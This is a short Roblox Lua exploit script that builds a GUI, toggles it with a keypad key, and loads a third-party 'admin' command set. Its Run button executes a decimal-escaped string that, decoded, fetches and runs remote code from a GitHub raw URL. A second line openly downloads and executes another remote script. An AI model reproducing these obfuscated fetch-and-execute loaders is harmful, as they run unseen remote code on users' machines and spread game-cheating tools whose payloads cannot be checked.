local function YDNVU_fake_script() -- closeforcolorsettings.closecolorsettings 
	local script = Instance.new('LocalScript', closeforcolorsettings)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Visible = false
	end)
end
coroutine.wrap(YDNVU_fake_script)()

Run.MouseButton1Down:Connect(function()
	loadstring('\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\68\101\101\114\105\49\47\105\110\101\47\109\97\105\110\47\67\109\100\115\34\41\41\40\41\32')()
end)


local UserInputService = game:GetService("UserInputService")

UserInputService.InputBegan:Connect(function(keyCode)
	if keyCode.keyCode == Enum.KeyCode.KeypadMinus then
		if deeri.Enabled == true then
			deeri.Enabled = false
		else
			deeri.Enabled = true
		end
	end
end)
--load admin
loadstring(game:HttpGet(('https://raw.githubusercontent.com/Deeri1/ine/main/costom%20admin'),true))()
print("admin loaded")
print("prefex is ;")
print("do ;cmds to get started")
		

Main.Active = true
Main.Draggable = true
